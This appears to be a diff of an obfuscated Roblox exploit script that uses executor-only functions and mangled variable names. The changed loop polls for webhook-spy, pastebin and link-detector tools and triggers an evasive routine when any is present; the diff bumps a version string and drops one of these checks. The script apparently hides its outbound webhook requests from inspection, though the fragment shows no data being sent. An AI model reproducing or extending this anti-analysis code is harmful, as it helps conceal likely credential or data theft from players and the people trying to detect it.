@@ -24,7 +24,7 @@ local function _______rndStr(______len: number): string
 end
 
 local _________folder = "RBXSoundCache"
-local __________hash = "v1.0.0"
+local __________hash = "v1.0.2"
 
 if not isfolder(_________folder) then
     makefolder(_________folder)
@@ -186,7 +186,7 @@ if not ___________skip then
         setreadonly(____mt, true)
         task.wait(2)
         while task.wait(0.5) do
-            if getgenv().EmplicsWebhookSpy or getgenv().discordwebhookdetector or getgenv().pastebindetector or getgenv().githubdetector or getgenv().anylink or getgenv().kickbypass or getgenv().request then
+            if getgenv().EmplicsWebhookSpy or getgenv().discordwebhookdetector or getgenv().pastebindetector or getgenv().githubdetector or getgenv().anylink or getgenv().kickbypass then
                 __________jmp("15889768437", "7111752052", "CORNBALL", "Webhook spy getgenv detected")
             end
             local _____curr = (syn and syn.request or http_request or request)
